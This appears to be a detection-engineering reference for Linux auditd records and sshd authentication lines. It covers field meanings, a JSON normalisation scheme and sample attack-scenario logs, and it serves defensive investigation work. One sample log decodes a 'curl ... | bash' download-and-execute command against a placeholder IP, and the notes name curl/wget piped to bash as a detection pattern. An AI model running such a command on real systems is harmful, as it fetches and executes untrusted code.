# Linux auditd — audit records (SYSCALL / EXECVE / USER_AUTH / USER_LOGIN …) and sshd auth lines

Category: Host telemetry (Linux). Vendor: Linux Audit (Red Hat / kernel auditd). Native format: auditd's own `type=... msg=audit(epoch:serial): key=value ...` text records (text-native); plus `sshd` PAM/auth lines in syslog.
Platform representation: **flat JSON** whose keys are the audit field names exactly (`type`, `audit_id` for the `msg=audit(...)` stamp, then `arch`, `syscall`, `exe`, `comm`, `auid`, `uid`, `key`, ...) + `raw`. For sshd: syslog header keys + the message parsed to `program`, `pid`, `message` + `raw`.

---

## 1. Official sources

| Source | What it confirmed |
|---|---|
| Red Hat Enterprise Linux "Security hardening" / "Understanding Audit log files" (https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/security_hardening/understanding-audit-log-files_auditing-the-system) | Record anatomy: `type=`, `msg=audit(<epoch>.<ms>:<serial>):`, field=value pairs; SYSCALL fields `arch, syscall, success, exit, a0..a3, ppid, pid, auid, uid, gid, euid, suid, fsuid, egid, sgid, fsgid, tty, ses, comm, exe, subj, key`; EXECVE `argc, a0, a1...`; hex-encoding of fields containing spaces/special chars; `auid` = loginuid, `ses` = session, `4294967295` = unset. |
| https://github.com/linux-audit/audit-documentation (field dictionary, record types) | Record types USER_AUTH, USER_LOGIN, USER_CMD, CRED_ACQ, USER_START, USER_ACCT, CWD, PATH, PROCTITLE; `msg='op=... acct="..." exe="..." hostname=... addr=... terminal=... res=success/failed'` inner format. |
| https://github.com/elastic/integrations/blob/main/packages/auditd/data_stream/log/_dev/test/pipeline/test-auditd-raw.log | Real records: `type=SYSCALL msg=audit(1485893834.891:18877199): arch=c000003e syscall=44 success=yes exit=184 ... comm="charon" exe=2F7573722F...(hex) key=(null)`; `type=EXECVE msg=audit(1581371984.206:579393): argc=1 a0=top`; `type=USER_AUTH ... msg='op=success acct="admin" exe="/usr/sbin/sshd" hostname=? addr=89.160.20.156 terminal=ssh res=success'`; `type=USER_LOGIN ... msg='op=login id=1000 exe="/usr/sbin/sshd" hostname=... addr=89.160.20.156 terminal=/dev/pts/0 res=success'`; `type=USER_CMD ... cmd=2F7573...(hex) terminal=? res=success'`; `type=CRED_ACQ ... msg='op=PAM:setcred acct="root" exe="/usr/bin/sudo" ... res=success'`; `type=PATH ... item=0 name="/sbin/auditctl" inode=... mode=0100750 ouid=0 ogid=0 ...`; `type=PROCTITLE msg=audit(...): proctitle="bash"`. |
| `sshd(8)` / OpenSSH logging | Auth line formats: `Accepted publickey for <user> from <ip> port <p> ssh2: <keytype> SHA256:<fp>`, `Failed password for [invalid user ]<user> from <ip> port <p> ssh2`. |

## 2. Native format and delivery

- auditd writes `/var/log/audit/audit.log`; shipped by auditd's own `audisp-syslog`/`audisp-remote`, or by agents (auditbeat, rsyslog, Wazuh). One **event** = several records sharing the same `audit(epoch:serial)` stamp (e.g. SYSCALL + EXECVE + CWD + PATH + PROCTITLE). The timestamp is epoch seconds`.`milliseconds; `serial` is the per-boot event ID.
- Fields with spaces, quotes, control chars, or non-UTF8 are **hex-encoded** (uppercase); plain tokens are bare; strings without spaces are double-quoted (`acct="root"`). Unset numeric IDs = `4294967295` (i.e. `-1`/`unset`).
- `key` is the `-k` tag from the audit rule that triggered the record (`(null)` if none).
- sshd lines are ordinary syslog (facility authpriv), separate from auditd; both are collected and correlated by `addr`/`pid`/time.
- **We standardise on:** flat JSON — `type`, `audit_id` (the `epoch.ms:serial` string), the parsed `epoch` and `serial`, then every field as-is (hex kept as hex, with a `*_decoded` convenience key only where noted), plus `raw`. Inner `msg='...'` sub-fields are flattened to top-level keys (`op`, `acct`, `exe`, `hostname`, `addr`, `terminal`, `res`).

## 3. Core field reference

| Field | Meaning | Values / notes |
|---|---|---|
| `type` | Record type | `SYSCALL`, `EXECVE`, `CWD`, `PATH`, `PROCTITLE`, `USER_AUTH`, `USER_ACCT`, `USER_LOGIN`, `CRED_ACQ`, `USER_START`, `USER_CMD`, `CRED_DISP`, ` anom_... ` |
| `audit_id` | `audit(<epoch>.<ms>:<serial>)` stamp | joins records of one event |
| `arch` | CPU arch | `c000003e` = x86_64 |
| `syscall` | Syscall number | `59` execve, `42` connect, `44` sendto, `257` openat, `2` open |
| `success` / `exit` | Result / return value | `yes`/`no`, integer |
| `a0..a3` | Syscall arg registers (hex) | |
| `ppid` / `pid` | Parent / process ID | |
| `auid` | Login UID (the real human) | survives su/sudo; `4294967295` = none |
| `uid` `euid` `suid` `fsuid` / `gid`...`fsgid` | User/group IDs | `0` = root |
| `tty` / `ses` | Controlling tty / audit session | |
| `comm` | Command name (short, quoted) | `"bash"` |
| `exe` | Executable path | quoted, or hex if special chars (`2F7573722F62696E2F...` = `/usr/bin/...`) |
| `subj` | SELinux context | |
| `key` | Audit rule key | `(null)`, `exec`, `identity`, `priv_esc` (custom) |
| `argc`, `a0`, `a1`... (EXECVE) | Argument count + args | bare if no spaces, else hex |
| `name`, `inode`, `mode`, `ouid`, `ogid`, `dev`, `objtype` (PATH) | File touched | `mode=0100750` |
| `cwd` (CWD) | Working directory | |
| `proctitle` (PROCTITLE) | Full cmdline | quoted or hex (NUL-separated args become hex) |
| `op`, `acct`, `hostname`, `addr`, `terminal`, `res` (USER_* inner msg) | PAM operation / target account / source host / source IP / tty / result | `res=success`/`failed`, `addr=?` when local |
| `id` (USER_LOGIN) | Logged-in uid | |
| `cmd` (USER_CMD) | Command run via sudo (hex) | |

## 4. Realistic samples

### 4.1 `curl | bash` download-and-execute (EXECVE event = SYSCALL + EXECVE + CWD + PROCTITLE)
```json
[
  {"type": "SYSCALL", "audit_id": "audit(1790838312.401:884412)", "epoch": "1790838312.401", "serial": "884412", "arch": "c000003e", "syscall": "59", "success": "yes", "exit": "0", "a0": "5607b2c1a3e0", "a1": "5607b2c1b120", "a2": "5607b2c1c450", "a3": "7ffe1a2b3c40", "items": "2", "ppid": "40112", "pid": "40118", "auid": "1007", "uid": "1007", "gid": "1007", "euid": "1007", "suid": "1007", "fsuid": "1007", "egid": "1007", "sgid": "1007", "fsgid": "1007", "tty": "pts2", "ses": "3391", "comm": "bash", "exe": "/usr/bin/bash", "subj": "unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023", "key": "exec",
   "raw": "type=SYSCALL msg=audit(1790838312.401:884412): arch=c000003e syscall=59 success=yes exit=0 a0=5607b2c1a3e0 a1=5607b2c1b120 a2=5607b2c1c450 a3=7ffe1a2b3c40 items=2 ppid=40112 pid=40118 auid=1007 uid=1007 gid=1007 euid=1007 suid=1007 fsuid=1007 egid=1007 sgid=1007 fsgid=1007 tty=pts2 ses=3391 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=\"exec\""},
  {"type": "EXECVE", "audit_id": "audit(1790838312.401:884412)", "epoch": "1790838312.401", "serial": "884412", "argc": "3", "a0": "bash", "a1": "-c", "a2": "6375726c202d6673534c20687474703a2f2f3139322e302e322e39302f732f692e7368207c2062617368", "a2_decoded": "curl -fsSL http://192.0.2.90/s/i.sh | bash",
   "raw": "type=EXECVE msg=audit(1790838312.401:884412): argc=3 a0=\"bash\" a1=\"-c\" a2=6375726C202D6673534C20687474703A2F2F3139322E302E322E39302F732F692E7368207C2062617368"},
  {"type": "CWD", "audit_id": "audit(1790838312.401:884412)", "epoch": "1790838312.401", "serial": "884412", "cwd": "/home/svc_deploy",
   "raw": "type=CWD msg=audit(1790838312.401:884412): cwd=\"/home/svc_deploy\""},
  {"type": "PROCTITLE", "audit_id": "audit(1790838312.401:884412)", "epoch": "1790838312.401", "serial": "884412", "proctitle": "62617368002D6300637572...", "proctitle_decoded": "bash -c curl -fsSL http://192.0.2.90/s/i.sh | bash",
   "raw": "type=PROCTITLE msg=audit(1790838312.401:884412): proctitle=62617368002D6300637572...TRUNCATED"}
]
```
(The `a2` hex decodes to the shown command; auditd hex-encodes it because it contains spaces and a pipe. The real PROCTITLE hex is the full NUL-separated argv — truncated here for readability.)

### 4.2 Follow-on outbound connection (the fetched payload beacons) — SYSCALL connect
```json
{"type": "SYSCALL", "audit_id": "audit(1790838313.887:884530)", "epoch": "1790838313.887", "serial": "884530", "arch": "c000003e", "syscall": "42", "success": "yes", "exit": "0", "a0": "7", "a1": "7ffe0c1d2a90", "a2": "10", "a3": "0", "items": "0", "ppid": "40118", "pid": "40140", "auid": "1007", "uid": "1007", "gid": "1007", "euid": "1007", "tty": "(none)", "ses": "3391", "comm": "i.sh", "exe": "/usr/bin/dash", "subj": "unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023", "key": "net_connect",
 "raw": "type=SYSCALL msg=audit(1790838313.887:884530): arch=c000003e syscall=42 success=yes exit=0 a0=7 a1=7ffe0c1d2a90 a2=10 a3=0 items=0 ppid=40118 pid=40140 auid=1007 uid=1007 gid=1007 euid=1007 tty=(none) ses=3391 comm=\"i.sh\" exe=\"/usr/bin/dash\" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=\"net_connect\""}
```
(Destination IP/port are in the sockaddr arg, not decoded by auditd into a field — recover from the paired SOCKADDR record, or pivot to Sysmon-for-Linux / EDR / firewall.)

### 4.3 Crontab persistence — user edits their crontab (USER_CMD via sudo-less crontab, + EXECVE)
```json
[
  {"type": "SYSCALL", "audit_id": "audit(1790885500.219:901233)", "epoch": "1790885500.219", "serial": "901233", "arch": "c000003e", "syscall": "59", "success": "yes", "exit": "0", "ppid": "41990", "pid": "42007", "auid": "1007", "uid": "1007", "gid": "1007", "euid": "1007", "tty": "pts2", "ses": "3391", "comm": "crontab", "exe": "/usr/bin/crontab", "subj": "unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023", "key": "cron_persist",
   "raw": "type=SYSCALL msg=audit(1790885500.219:901233): arch=c000003e syscall=59 success=yes exit=0 ppid=41990 pid=42007 auid=1007 uid=1007 gid=1007 euid=1007 tty=pts2 ses=3391 comm=\"crontab\" exe=\"/usr/bin/crontab\" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=\"cron_persist\""},
  {"type": "EXECVE", "audit_id": "audit(1790885500.219:901233)", "epoch": "1790885500.219", "serial": "901233", "argc": "2", "a0": "crontab", "a1": "-e",
   "raw": "type=EXECVE msg=audit(1790885500.219:901233): argc=2 a0=\"crontab\" a1=\"-e\""},
  {"type": "PATH", "audit_id": "audit(1790885500.503:901240)", "epoch": "1790885500.503", "serial": "901240", "item": "0", "name": "/var/spool/cron/svc_deploy", "inode": "263199", "dev": "fd:00", "mode": "0100600", "ouid": "1007", "ogid": "1007", "rdev": "00:00", "objtype": "CREATE", "key": "cron_persist",
   "raw": "type=PATH msg=audit(1790885500.503:901240): item=0 name=\"/var/spool/cron/svc_deploy\" inode=263199 dev=fd:00 mode=0100600 ouid=1007 ogid=1007 rdev=00:00 obj=unconfined_u:object_r:user_cron_spool_t:s0 objtype=CREATE"}
]
```

### 4.4 sudo to root (USER_CMD + CRED_ACQ + USER_START chain)
```json
[
  {"type": "USER_CMD", "audit_id": "audit(1790885520.771:901310)", "epoch": "1790885520.771", "serial": "901310", "pid": "42101", "uid": "1007", "auid": "1007", "ses": "3391", "op": null, "cwd": "/home/svc_deploy", "cmd": "73797374656d63746c2072657374617274206e67696e78", "cmd_decoded": "systemctl restart nginx", "terminal": "pts/2", "res": "success",
   "raw": "type=USER_CMD msg=audit(1790885520.771:901310): pid=42101 uid=1007 auid=1007 ses=3391 msg='cwd=\"/home/svc_deploy\" cmd=73797374656D63746C2072657374617274206E67696E78 terminal=pts/2 res=success'"},
  {"type": "CRED_ACQ", "audit_id": "audit(1790885520.779:901311)", "epoch": "1790885520.779", "serial": "901311", "pid": "42101", "uid": "0", "auid": "1007", "ses": "3391", "op": "PAM:setcred", "acct": "root", "exe": "/usr/bin/sudo", "hostname": "?", "addr": "?", "terminal": "/dev/pts/2", "res": "success",
   "raw": "type=CRED_ACQ msg=audit(1790885520.779:901311): pid=42101 uid=0 auid=1007 ses=3391 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'"},
  {"type": "USER_START", "audit_id": "audit(1790885520.781:901312)", "epoch": "1790885520.781", "serial": "901312", "pid": "42101", "uid": "0", "auid": "1007", "ses": "3391", "op": "PAM:session_open", "acct": "root", "exe": "/usr/bin/sudo", "hostname": "?", "addr": "?", "terminal": "/dev/pts/2", "res": "success",
   "raw": "type=USER_START msg=audit(1790885520.781:901312): pid=42101 uid=0 auid=1007 ses=3391 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/2 res=success'"}
]
```

### 4.5 SSH brute force then success — auditd USER_AUTH/USER_LOGIN + matching sshd syslog
```json
[
  {"type": "USER_AUTH", "audit_id": "audit(1790810047.112:880001)", "epoch": "1790810047.112", "serial": "880001", "pid": "38120", "uid": "0", "auid": "4294967295", "ses": "4294967295", "op": "PAM:authentication", "acct": "svc_deploy", "exe": "/usr/sbin/sshd", "hostname": "?", "addr": "198.51.100.77", "terminal": "ssh", "res": "failed",
   "raw": "type=USER_AUTH msg=audit(1790810047.112:880001): pid=38120 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"svc_deploy\" exe=\"/usr/sbin/sshd\" hostname=? addr=198.51.100.77 terminal=ssh res=failed'"},
  {"timestamp": "Oct  1 02:14:07", "hostname": "app-prod-01", "program": "sshd", "pid": "38120", "message": "Failed password for svc_deploy from 198.51.100.77 port 54122 ssh2",
   "raw": "<38>Oct  1 02:14:07 app-prod-01 sshd[38120]: Failed password for svc_deploy from 198.51.100.77 port 54122 ssh2"},
  {"timestamp": "Oct  1 02:14:09", "hostname": "app-prod-01", "program": "sshd", "pid": "38124", "message": "Failed password for invalid user admin from 198.51.100.77 port 54140 ssh2",
   "raw": "<38>Oct  1 02:14:09 app-prod-01 sshd[38124]: Failed password for invalid user admin from 198.51.100.77 port 54140 ssh2"},
  {"type": "USER_LOGIN", "audit_id": "audit(1790810052.660:880097)", "epoch": "1790810052.660", "serial": "880097", "pid": "38210", "uid": "0", "auid": "1007", "ses": "3402", "op": "login", "id": "1007", "exe": "/usr/sbin/sshd", "hostname": "198.51.100.77", "addr": "198.51.100.77", "terminal": "/dev/pts/3", "res": "success",
   "raw": "type=USER_LOGIN msg=audit(1790810052.660:880097): pid=38210 uid=0 auid=1007 ses=3402 msg='op=login id=1007 exe=\"/usr/sbin/sshd\" hostname=198.51.100.77 addr=198.51.100.77 terminal=/dev/pts/3 res=success'"},
  {"timestamp": "Oct  1 02:14:12", "hostname": "app-prod-01", "program": "sshd", "pid": "38210", "message": "Accepted password for svc_deploy from 198.51.100.77 port 54201 ssh2",
   "raw": "<38>Oct  1 02:14:12 app-prod-01 sshd[38210]: Accepted password for svc_deploy from 198.51.100.77 port 54201 ssh2"}
]
```

## 5. Investigation notes

- **The one field that never lies: `auid`.** It is the login UID set at session start and preserved through `su`/`sudo`, so `uid=0` with `auid=1007` tells you the human who became root. `auid=4294967295` on USER_AUTH = pre-login (the sshd daemon side of a failed/early auth).
- **Join an event:** all records with the same `audit(epoch:serial)` belong together — SYSCALL (the action + credentials) + EXECVE (argv) + CWD + PATH (files) + PROCTITLE (full cmdline). Decode hex fields to read argv/paths.
- **Brute force:** USER_AUTH `res=failed` (and sshd `Failed password` / `invalid user`) grouped by `addr`; the first `res=success` / USER_LOGIN from the same `addr` is the breach. `invalid user` = the account does not exist (spray).
- **curl|bash & persistence:** EXECVE with `curl`/`wget`/`bash -c` + a URL; crontab writes land as PATH `name=/var/spool/cron/<user>` with `objtype=CREATE`, or systemd units under `/etc/systemd/system`. Pivot the downloaded URL/host to proxy/DNS/firewall logs.
- **Network:** auditd `connect`/`sendto` syscalls do not expose the dest IP as a field (it is in the sockaddr) — correlate by `pid`/time with firewall, Zeek, or EDR for the destination.
- **Pivot across hosts:** `addr` in USER_LOGIN = the source IP of the SSH session; trace it back to the VPN/ZTNA session (same public IP) and forward to what the session did (subsequent EXECVE under the same `ses`).

## 6. Common mistakes / fields that do NOT exist

- There is no `user`, `username`, `src_ip`, `command`, `process.name` field — use `auid`/`uid`, `addr`, `exe`/`comm`, and decode EXECVE/`cmd`.
- `exe`, EXECVE args, `cmd`, and `proctitle` are **hex-encoded whenever they contain spaces or special characters** — a bare `a0=top` is only because it had none. Don't assume plaintext.
- The timestamp is inside `msg=audit(<epoch>.<ms>:<serial>)`, not a separate `time=` field; `serial` is not a PID.
- `4294967295` means "unset", not a real UID/session.
- `comm` is truncated to 16 chars; it is not the full path (that's `exe`).
- auditd records carry no destination IP/port, no hostname geo, no file hash — those come from other sources.
- sshd auth lines are syslog, not auditd — keep them as their own (syslog-shaped) records; don't fold them into `type=` auditd fields.
- Don't output Elastic `auditd.log.*` / ECS or a Wazuh `data.audit.*` envelope.
